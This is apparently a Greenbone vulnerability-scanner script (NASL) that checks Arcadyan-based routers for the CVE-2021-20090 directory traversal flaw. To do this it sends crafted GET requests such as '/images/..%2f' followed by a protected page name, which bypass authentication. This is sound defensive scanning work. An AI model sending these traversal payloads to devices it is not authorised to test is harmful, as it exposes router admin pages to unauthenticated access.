if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.146487" );
	script_version( "2021-08-24T09:01:06+0000" );
	script_tag( name: "last_modification", value: "2021-08-24 09:01:06 +0000 (Tue, 24 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-08-10 09:45:16 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-07-20 22:15:00 +0000 (Tue, 20 Jul 2021)" );
	script_cve_id( "CVE-2021-20090" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "NoneAvailable" );
	script_name( "Arcadyan Directory Traversal Vulnerability (Apr 2021) - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc" );
	script_mandatory_keys( "Arcadyan/banner" );
	script_require_ports( "Services/www", 443 );
	script_tag( name: "summary", value: "Arcadyan devices are prone to a directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Sends multiple crafted HTTP GET requests and checks the responses." );
	script_tag( name: "insight", value: "Arcadyan based devices are prone to a directory traversal
  vulnerability where an unauthenticated attacker can access pages which normally would need
  authentication." );
	script_tag( name: "affected", value: "Multiple Arcadyan based devices (e.g. ASUS DSL-AC, Deutsche
  Telekom Speedport Smart 3, Buffalo WSR/BBR/WXR, Vodafone EasyBox and others)." );
	script_tag( name: "solution", value: "No known solution is available as of 10th August, 2021.
  Information regarding this issue will be updated once solution details are available." );
	script_xref( name: "URL", value: "https://www.tenable.com/security/research/tra-2021-13" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 443 );
banner = http_get_remote_headers( port: port );
if(!banner || !IsMatchRegexp( banner, "Server\\s*:\\s(Arcadyan )?httpd" )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
urls = make_list();
found_links = make_list();
exts = http_get_kb_file_extensions( port: port, host: host, ext: "htm*" );
if(exts && is_array( exts )){
	urls = make_list( exts );
}
for url in nasl_make_list_unique( "/index.htm", "/index.html", "/info.html", urls ) {
	res = http_get_cache( port: port, item: url );
	links = egrep( pattern: "\"[^.]+\\.html?", string: res );
	links = split( buffer: links, keep: FALSE );
	for link in links {
		link = eregmatch( pattern: "\"([^.]+\\.html?)", string: link );
		if(!isnull( link[1] )){
			found_links = nasl_make_list_unique( found_links, link[1] );
		}
	}
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 30[0-9]" )){
		continue;
	}
	url = ereg_replace( pattern: "^/", string: url, replace: "" );
	payloads = make_list( "/images/..%2f" + url,
		 "/js/..%2f" + url,
		 "/css/..%2f" + url );
	for payload in payloads {
		req = http_get( port: port, item: payload );
		res = http_keepalive_send_recv( port: port, data: req );
		if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
			report = http_report_vuln_url( port: port, url: payload );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
for url in found_links {
	url = ereg_replace( pattern: "^/", string: url, replace: "" );
	url = "/" + url;
	res = http_get_cache( port: port, item: url );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 30[0-9]" )){
		continue;
	}
	url = ereg_replace( pattern: "^/", string: url, replace: "" );
	payloads = make_list( "/images/..%2f" + url,
		 "/js/..%2f" + url,
		 "/css/..%2f" + url );
	for payload in payloads {
		req = http_get( port: port, item: payload );
		res = http_keepalive_send_recv( port: port, data: req );
		if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
			report = http_report_vuln_url( port: port, url: payload );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

